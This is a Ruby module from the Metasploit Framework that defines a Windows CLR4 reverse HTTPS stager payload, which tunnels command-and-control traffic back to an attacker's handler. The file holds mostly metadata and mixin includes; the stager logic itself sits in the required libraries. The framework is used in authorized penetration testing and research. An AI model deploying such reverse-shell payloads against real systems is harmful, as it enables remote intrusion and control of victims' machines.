##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core/handler/reverse_https'
require 'msf/core/payload/clr4/reverse_https'

module MetasploitModule

  CachedSize = 414

  include Msf::Payload::Stager
  include Msf::Payload::Clr4::ReverseHttps

  def initialize(info = {})
    super(merge_info(info,
      'Name'        => 'CLR4 Reverse HTTPS Stager',
      'Description' => 'Tunnel communication over HTTPS (CLR4)',
      'Author'      => ['OJ Reeves'],
      'License'     => MSF_LICENSE,
      'Platform'    => 'win',
      'Arch'        => ARCH_CLR4,
      'Handler'     => Msf::Handler::ReverseHttps,
      'Convention'  => 'https'
    ))
  end
end
